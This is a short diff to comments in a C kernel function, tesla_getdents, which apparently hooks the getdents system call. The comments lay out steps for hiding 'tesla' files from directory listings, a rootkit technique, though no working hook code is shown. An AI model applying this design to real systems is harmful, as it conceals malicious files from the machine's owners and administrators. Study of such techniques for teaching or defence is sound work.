@@ -24,7 +24,7 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 	//step 1: total_size = orig_getdents( 3 ,dirp, ?)
 	//kmalloc(total_size, GFP_KERNEL)
 	//step 2: copy_from_user(dirp_kernel, dirp, total_size) total_size depends on whether or not tesla file occurs first, remove if first, else hide
-	//step 3: merge dirp, hide/delete tesla files
+	//step 3: merge dirp, hide/delete tesla files. file above size + tesla size. OR skip tesla file if on top
 	//step 4: copy_to_user(dirp, dirp_kernel, total_size)
 	//
 	// 
